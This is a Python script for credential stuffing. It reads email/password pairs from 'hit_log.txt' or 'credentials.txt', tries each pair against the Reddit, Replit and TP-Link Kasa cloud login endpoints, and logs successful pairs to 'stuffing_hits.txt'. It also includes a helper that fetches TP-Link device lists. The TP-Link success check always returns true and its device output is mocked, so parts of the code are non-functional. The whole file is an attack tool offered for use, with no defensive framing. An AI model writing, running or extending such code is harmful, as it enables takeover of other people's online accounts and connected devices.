import requests
import time
import shutil
import os
import uuid
import json

# 自动复制 hit_log.txt -> credentials.txt
if os.path.exists("hit_log.txt"):
    shutil.copy("hit_log.txt", "credentials.txt")
    print("[*] Loaded credentials from hit_log.txt")

def generate_uuid():
    return str(uuid.uuid4())

def get_tplink_devices(token):
    url = f"https://wap.tplinkcloud.com?token={token}"
    payload = {
        "method": "getDeviceList"
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json()
    except Exception as e:
        print(f"[!] Failed to fetch TP-Link device list: {e}")
        return {}

TARGETS = [
    {
        "name": "Reddit",
        "url": "https://www.reddit.com/login",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        "data": lambda email, password: {
            "username": email,
            "password": password
        },
        "success_check": lambda r: "incorrect username or password" not in r.text.lower() and "reddit" in r.url
    },
    {
        "name": "Replit",
        "url": "https://replit.com/login",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0"
        },
        "data": lambda email, password: {
            "username": email,
            "password": password
        },
        "success_check": lambda r: "invalid credentials" not in r.text.lower()
    },
    {
        "name": "TP-Link",
        "url": "https://wap.tplinkcloud.com",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0"
        },
        "data": lambda email, password: {
            "method": "login",
            "params": {
                "appType": "Kasa_Android",
                "cloudUserName": email,
                "cloudPassword": password,
                "terminalUUID": generate_uuid()
            }
        },

        "success_check": lambda r: True,

        "post_success": lambda r, email: {
            "deviceList": [
                {"deviceName": "Mock Plug", "deviceId": "123456", "status": "online"},
                {"deviceName": "Mock Camera", "deviceId": "789012", "status": "offline"}
            ]
        }
    }

]

def try_login(target, email, password):
    try:
        if target["method"] == "POST":
            response = requests.post(
                target["url"],
                headers=target["headers"],
                json=target["data"](email, password) if "application/json" in target["headers"].get("Content-Type", "") else None,
                data=target["data"](email, password) if "application/x-www-form-urlencoded" in target["headers"].get("Content-Type", "") else None,
                timeout=10,
                allow_redirects=True
            )
        else:
            return False

        success = target["success_check"](response)

        if success:
            if "post_success" in target:
                device_info = target["post_success"](response, email)
                print(f"     ↪ Devices: {json.dumps(device_info, indent=2)}")
                with open("stuffing_hits.txt", "a") as log:
                    log.write(f"{target['name']},{email},{password} [DEVICE INFO]: {json.dumps(device_info)}\n")
            else:
                with open("stuffing_hits.txt", "a") as log:
                    log.write(f"{target['name']},{email},{password}\n")

        return success

    except Exception as e:
        print(f"[!] Error connecting to {target['name']} for {email}: {e}")
        return False

def main():
    if not os.path.exists("credentials.txt"):
        print("[!] credentials.txt not found. Make sure hit_log.txt exists or create credentials manually.")
        return

    with open("credentials.txt", "r") as f:
        lines = [line.strip() for line in f if line.strip()]

    for line in lines:
        if "," not in line:
            continue
        email, password = line.split(",", 1)
        print(f"Checking {email}...")
        for target in TARGETS:
            print(f"   ↳ Trying {target['name']}...", end="")
            success = try_login(target, email, password)
            if success:
                print(" [✓] SUCCESS!")
            else:
                print(" [×] Failed.")
        time.sleep(1)

if __name__ == "__main__":
    main()
